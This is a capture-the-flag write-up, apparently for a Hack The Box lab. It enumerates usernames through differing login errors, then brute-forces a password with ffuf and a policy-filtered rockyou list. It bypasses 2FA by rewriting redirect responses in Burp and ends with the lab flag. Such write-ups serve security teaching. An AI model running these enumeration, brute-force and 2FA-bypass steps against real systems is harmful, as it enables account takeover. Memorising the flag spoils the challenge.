## Scenario

You are tasked to perform a security assessment of a client's web application. For the assessment, the client has not provided you with credentials. Apply what you have learned in this module to obtain the flag.

![Pasted image 20250215140214.png](../../../IMAGES/Pasted%20image%2020250215140214.png)

Let's begin by checking the website:

![Pasted image 20250215140227.png](../../../IMAGES/Pasted%20image%2020250215140227.png)

We have a login functionality, let's check it out:

![Pasted image 20250215140248.png](../../../IMAGES/Pasted%20image%2020250215140248.png)

We can begin by registering a new account and checking the behavior in burp:

```ad-note
`test`:`test`
```

If we do those credentials, we get the following:


![Pasted image 20250215140815.png](../../../IMAGES/Pasted%20image%2020250215140815.png)


Now we know the password policy, it goes like this:

```ad-important
Password does not meet our password policy:
    Contains at least one digit
    Contains at least one lower-case character
    Contains at least one upper-case character
    Contains NO special characters
    Is exactly 12 characters long
```

Nice, let's register an account that goes like that:

```ad-note
`test`:`Passw0rd1123`
```

We can now test how it looks like when a valid username goes through the application:

![Pasted image 20250215155348.png](../../../IMAGES/Pasted%20image%2020250215155348.png)

We get `Invalid credentials`, what if we use an invalid user:

![Pasted image 20250215155424.png](../../../IMAGES/Pasted%20image%2020250215155424.png)

Now we get another error `Unknown username or password.`, once we know this, we can use ffuf in order to fuzz for valid usernames:

```
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.55.157:40800/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=test" -fr "Unknown username or password." -ic -c -t 200
```

After a while, we get the following:

```
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.55.157:40800/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=test" -fr "Unknown username or password." -ic -c -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.55.157:40800/login.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=test
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Unknown username or password.
________________________________________________

gladys                  [Status: 200, Size: 4344, Words: 680, Lines: 91, Duration: 196ms]
```

We got a valid username:

```
gladys
```

Now, with the valid username, we can try to brute-force the password creating a custom wordlist matching the password policy, let's grep the `rockyou.txt` wordlist:

```
grep -P '^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])[A-Za-z0-9]{12}$' /usr/share/wordlists/rockyou.txt > filtered_rockyou.txt
```

This will filter `rockyou` wordlist to match the password policy, now let's use ffuf:


```
ffuf -w filtered_rockyou.txt -u http://94.237.55.157:40800/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials" -ic -c -t 200
```


After a while, we get this:

```
ffuf -w filtered_rockyou.txt -u http://94.237.55.157:40800/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials" -ic -c -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.55.157:40800/login.php
 :: Wordlist         : FUZZ: /home/samsepiol/filtered_rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=gladys&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid credentials
________________________________________________

dWinaldasD13            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 156ms]
```

We got credentials:

```ad-note
`gladys`:`dWinaldasD13`
```

If we try to log in, we can see the following:

![Pasted image 20250215160432.png](../../../IMAGES/Pasted%20image%2020250215160432.png)

We are redirected to `/2fa.php`, we need to bypass it, let's do the following:

Let's start by sending a request and checking the behavior:

![Pasted image 20250215160533.png](../../../IMAGES/Pasted%20image%2020250215160533.png)

If we send an invalid OTP, we get `Invalid OTP` error, knowing this, let's create a list of OTPs and fuzz:

```
seq -w 0 9999 > tokens.txt
```

```
ffuf -w tokens.txt -u http://94.237.55.157:40800/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=k0p7io2i4ucilmknkgt9m2ukd5" -d "otp=FUZZ" -fr "Invalid OTP" -ic -c -t 200
```

After a while, we are unable to get any OTP by fuzzing, which means, this is not the intended path to take, that's when logging into our `test` account is truly helpful, if we log in, we can see the following:

![Pasted image 20250215164723.png](../../../IMAGES/Pasted%20image%2020250215164723.png)

We are redirected to `/profile.php` instead of `/2fa.php`, that means that if we're able to change the `Location` to `/profile.php` on glady's account, we'd be able to bypass the 2fa code requirement, let's do it:

![Pasted image 20250215164842.png](../../../IMAGES/Pasted%20image%2020250215164842.png)

`Do intercept -> Response to this request`:

![Pasted image 20250215164923.png](../../../IMAGES/Pasted%20image%2020250215164923.png)

Now, change `Location` to `/profile.php`:

![Pasted image 20250215165100.png](../../../IMAGES/Pasted%20image%2020250215165100.png)

Forward and `Do intercept -> Response to this request` again:

![Pasted image 20250215165141.png](../../../IMAGES/Pasted%20image%2020250215165141.png)

We get a GET request, we need to intercept this one too and change status code to `200` and `location` to `/profile.php` again:

![Pasted image 20250215165225.png](../../../IMAGES/Pasted%20image%2020250215165225.png)

After forwarding the request, this happens:

![Pasted image 20250215165242.png](../../../IMAGES/Pasted%20image%2020250215165242.png)

We get access to glady's account and got the flag:

```
HTB{d86115e037388d0fa29280b737fd9171} 
```


![Pasted image 20250215165319.png](../../../IMAGES/Pasted%20image%2020250215165319.png)


